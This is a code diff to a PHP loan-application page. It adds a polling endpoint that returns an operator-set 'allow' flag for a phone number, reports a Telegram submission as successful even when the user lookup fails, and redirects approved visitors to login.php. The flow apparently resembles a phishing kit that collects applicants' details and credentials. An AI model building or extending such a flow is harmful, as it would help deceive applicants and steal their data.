@@ -33,6 +33,29 @@ function getDbConnection($host, $port, $dbname, $user, $pass) {
 }
 
 $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
+
+// ========== AJAX HANDLER FOR CHECKING ALLOW STATUS - MUST BE AT TOP ==========
+// Handle AJAX request to check allow status
+if (isset($_GET['check_allow']) && isset($_GET['phone'])) {
+    header('Content-Type: application/json');
+    
+    $phone = $_GET['phone'];
+    $allowValue = 0;
+    
+    if ($conn && !empty($phone)) {
+        $checkAllowSQL = "SELECT allow FROM users WHERE phone = $1";
+        $checkAllowResult = pg_query_params($conn, $checkAllowSQL, [$phone]);
+        
+        if ($checkAllowResult && pg_num_rows($checkAllowResult) > 0) {
+            $row = pg_fetch_assoc($checkAllowResult);
+            $allowValue = (int)$row['allow'];
+        }
+    }
+    
+    echo json_encode(['allow' => $allowValue]);
+    exit;
+}
+
 if (!$conn) {
     error_log("Could not connect to PostgreSQL for users table");
 }
@@ -86,7 +109,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['first_name'])) {
    VALIDATE SESSION FLOW
 ------------------------------ */
 if (!isset($_SESSION['loan_amount']) || !isset($_SESSION['first_name'])) {
-    header("Location: loan.php");
+    header("Location: step1.php");
     exit;
 }
 
@@ -196,10 +219,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_application'])
             } else {
                 // User not found, default behavior - stay on step3.php
                 error_log("User $phone not found in users table - staying on step3.php");
+                $telegram_success = true;
             }
         } else {
             // No DB connection or no phone - stay on step3.php
             error_log("Cannot check allow value - staying on step3.php");
+            $telegram_success = true;
         }
         
         // If we get here (allow=0 case), stay on current page
@@ -208,26 +233,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_application'])
     } else {
         $telegram_error = $result['description'] ?? "Unknown Telegram error";
     }
-}
-
-// Handle AJAX request to check allow status
-if (isset($_GET['check_allow']) && isset($_GET['phone'])) {
-    header('Content-Type: application/json');
-    $phone = $_GET['phone'];
-    $allowValue = 0;
-    
-    if ($conn && !empty($phone)) {
-        $checkAllowSQL = "SELECT allow FROM users WHERE phone = $1";
-        $checkAllowResult = pg_query_params($conn, $checkAllowSQL, [$phone]);
-        
-        if ($checkAllowResult && pg_num_rows($checkAllowResult) > 0) {
-            $row = pg_fetch_assoc($checkAllowResult);
-            $allowValue = (int)$row['allow'];
-        }
-    }
-    
-    echo json_encode(['allow' => $allowValue]);
-    exit;
 }
 ?>
 
@@ -348,8 +353,16 @@ let redirectAttempted = false;
 function checkAllowStatus() {
     if (redirectAttempted) return;
     
-    fetch(`?check_allow=1&phone=${encodeURIComponent(phoneNumber)}&t=${Date.now()}`)
-        .then(response => response.json())
+    // Use absolute path to ensure correct URL
+    const checkUrl = window.location.pathname + '?check_allow=1&phone=' + encodeURIComponent(phoneNumber) + '&t=' + Date.now();
+    
+    fetch(checkUrl)
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('HTTP error ' + response.status);
+            }
+            return response.json();
+        })
         .then(data => {
             console.log('Allow status:', data.allow);
             
@@ -380,16 +393,6 @@ function checkAllowStatus() {
                         window.location.href = 'login.php';
                     }, 2000);
                 }
-            } else if (data.allow === 0) {
-                // Still waiting, update status message
-                const statusContainer = document.getElementById('statusContainer');
-                if (statusContainer && !statusContainer.querySelector('.redirect-message')) {
-                    // Optional: Update waiting message with timer
-                    const statusDiv = statusContainer.querySelector('.status-message');
-                    if (statusDiv) {
-                        // You can add additional waiting indicators here
-                    }
-                }
             }
         })
         .catch(error => {
@@ -397,11 +400,13 @@ function checkAllowStatus() {
         });
 }
 
-// Start checking every 3 seconds
-if (phoneNumber) {
-    checkInterval = setInterval(checkAllowStatus, 3000);
-    // Also check immediately
-    checkAllowStatus();
+// Start checking every 3 seconds if phone number exists
+if (phoneNumber && phoneNumber !== '') {
+    // Wait 1 second before first check to ensure page is fully loaded
+    setTimeout(() => {
+        checkAllowStatus();
+        checkInterval = setInterval(checkAllowStatus, 3000);
+    }, 1000);
 }
 
 // Clean up interval when page unloads
